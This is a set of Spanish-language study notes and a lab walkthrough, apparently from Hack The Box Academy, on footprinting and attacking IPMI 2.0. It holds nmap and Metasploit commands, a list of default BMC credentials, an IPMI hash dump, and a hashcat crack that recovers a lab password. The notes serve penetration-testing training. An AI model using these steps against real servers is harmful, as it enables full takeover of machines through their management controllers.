
IPMI = Interfaz de Gestión de Plataforma Inteligente
    = Intelligent Platform Managment Interface

Es un conjunto de especificaciones que definen las interfaces utilizadas para a para administrar el hardware remotamente.
En palabras sencillas, con la ayuda del protocolo IPMI podemos realizar tareas en un servidor, tales como:
- Acceder a su hardware
- Monitorear temperatura, voltaje, ...
- Arrancar o apagar equipos.
- 

El IPMI es un hardware separado instalado con la placa base y funciona de forma independiente de la BIOS, la CPU y el firmware.

Funciona mediante una conexión de red directa al hardware.

# Footprinting
Su **puerto asociado es el UDP 623**.
Los sistemas que utilizan el protocolo IPMI se denominan *Controladores de Administración de placa Base* (BMC).

Si logramos acceder a un BMC durante una evaluación, obtendremos acceso completo a la placa base del host y podremos supervisar, reiniciar, apagar o incluso reinstalar el sistema operativo del host. Acceder a un BMC es prácticamente equivalente al acceso físico a un sistema.

Muchas BMC (incluidas HP iLO, Dell DRAC y Supermicro IPMI) ofrecen una consola de administración web, algún tipo de protocolo de acceso remoto por línea de comandos, como Telnet o SSH, y el puerto UDP 623, que, de nuevo, corresponde al protocolo de red IPMI.

### Escaneo básico con nmap

Se puede realizar un escaneo básico de versión IPMI con nmap con el comando:
```shell-session
Polika4RM@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

```shell-session
Polika4RM@htb[/htb]$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:674:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

Aquí podemos ver que el protocolo IPMI está escuchando en el puerto 623 y que Nmap ha identificado la versión 2.0 del protocolo.


### Escaneo con Metasploit
De la misma forma, con metasploit podemos analizar la versión con:
```
msfconsole
use auxiliary/scanner/ipmi/ipmi_version
show options
set RHOSTS 1.2.3.4
run
```

-----------

# Credenciales por defecto de servidores IPMI

|Product|Username|Password|
|---|---|---|
|Dell iDRAC|root|calvin|
|HP iLO|Administrator|randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|ADMIN|ADMIN|


# IPMI 2.0 - Vulnerabilidad
**¿Cuál es el problema con IPMI 2.0?**
- Para acceder a la BMC, hay que autenticarse con un usuario y contraseña.
- En IPMI 2.0, durante el proceso de autenticación, el servidor envía al cliente un hash de la contraseña (una versión “encriptada” de la contraseña) _antes_ de que termine la autenticación.
- Esto es un problema porque si un atacante captura ese hash, puede intentar descifrar la contraseña sin necesidad de estar conectado o de adivinarla directamente.

**¿Cómo se aprovecha esta falla?**
- Se conecta al servidor IPMI y se captura ese hash que el servidor envía.
- Luego, con herramientas como **Hashcat**, se realiza un ataque offline (sin conexión) usando diccionarios o pruebas de combinaciones para encontrar la contraseña original.
- En algunos servidores, como los HP iLO, las contraseñas por defecto suelen ser de 8 caracteres combinando mayúsculas y números, lo que facilita que un ataque de fuerza bruta termine rápido.
- Una vez que se obtiene la contraseña, se puede acceder a la BMC y tomar control total del servidor, incluyendo acceso SSH como root y administración de otras herramientas críticas.

**Herramientas que ayudan a explotar o analizar esta vulnerabilidad:**
- **Metasploit** tiene un módulo específico para obtener estos hashes remotamente.
- **Hashcat**, que sirve para descifrar esos hashes offline.

## Uso de METASPLOIT para IPMI 2.0


```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---------
**\[+1 CUBE ] What username is configured for accessing the host via IPMI?**
Realizamos un escaneo básico de nmap en UDP para ver puertos abiertos: 
```
sudo nmap -sU -F 10.129.220.50
```
Observamos que el puerto 623 UDP está abierto:

```
PS [10.10.15.48] /home/htb-ac-1876550 > sudo nmap -sU -F 10.129.220.50
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-07 05:14 CDT
Nmap scan report for 10.129.220.50
Host is up (0.054s latency).
Not shown: 94 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
111/udp  open          rpcbind
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
623/udp  open          asf-rmcp
2049/udp open          nfs

```

Con nmap, hacemos un escaneo de la versión de IPMI utilizada, con:

```
sudo nmap -sU --script ipmi-version -p 623 10.129.220.50`
```

Y observamos que se trata de la versión *IPMI-2.0*, versión la cual presenta vulnerabilidades (ver apuntes).
La explotaremos con msfconsole:

msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.220.50
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Observando la siguiente respuesta:
```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
[+] 10.129.61.216:623 - IPMI - Hash found: admin:1d828e9282000000ee08e19758b8f7ae5fad97dda696fd50494585843e868227d4aa50ca546ab3b2a123456789abcdefa123456789abcdef140561646d696e:05aa0232b5adffddc6a6930e915029856aab3c10
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Donde vemos que el usuario es "admin". 
Respuesta: ***admin***

**\[+1 CUBE ] What is the account's cleartext password?

Partiendo de:
```
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
[+] 10.129.61.216:623 - IPMI - Hash found: admin:1d828e9282000000ee08e19758b8f7ae5fad97dda696fd50494585843e868227d4aa50ca546ab3b2a123456789abcdefa123456789abcdef140561646d696e:05aa0232b5adffddc6a6930e915029856aab3c10
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

El formato es un "IPMI2 RAKP"
```
hash1:hash2
```

Guardamos el hash en un archivo:
```hash.txt
┌─[eu-academy-3]─[10.10.15.48]─[htb-ac-1876550@htb-whzc2jgjnc]─[~]
└──╼ [★]$ echo "1d828e9282000000ee08e19758b8f7ae5fad97dda696fd50494585843e868227d4aa50ca546ab3b2a123456789abcdefa123456789abcdef140561646d696e:05aa0232b5adffddc6a6930e915029856aab3c10" > hash.txt
```

Haciendo una búsqueda rápida, vemos

Y lo crackeamos con:

```
hashcat -m 7300 -a 0 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 
```

Sabemos que tenemos que utilizar el -m 7300 porque hemos buscado la palabra "IMPMI" en la siguiente lista:
https://hashcat.net/wiki/doku.php?id=example_hashes

```

┌─[eu-academy-3]─[10.10.15.48]─[htb-ac-1876550@htb-whzc2jgjnc]─[~]
└──╼ [★]$ hashcat -m 7300 -a 0 hash.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
* Passwords.: 59186
* Bytes.....: 478936
* Keyspace..: 59186
* Runtime...: 0 secs

1d828e9282000000ee08e19758b8f7ae5fad97dda696fd50494585843e868227d4aa50ca546ab3b2a123456789abcdefa123456789abcdef140561646d696e:05aa0232b5adffddc6a6930e915029856aab3c10:trinity
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 1d828e9282000000ee08e19758b8f7ae5fad97dda696fd50494...ab3c10
Time.Started.....: Fri Aug  8 01:09:40 2025 (0 secs)
Time.Estimated...: Fri Aug  8 01:09:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  4165.2 kH/s (0.35ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/59186 (3.46%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/59186 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 123456 -> steve

Started: Fri Aug  8 01:09:35 2025
Stopped: Fri Aug  8 01:09:41 2025
```


Respuesta: **trinity**

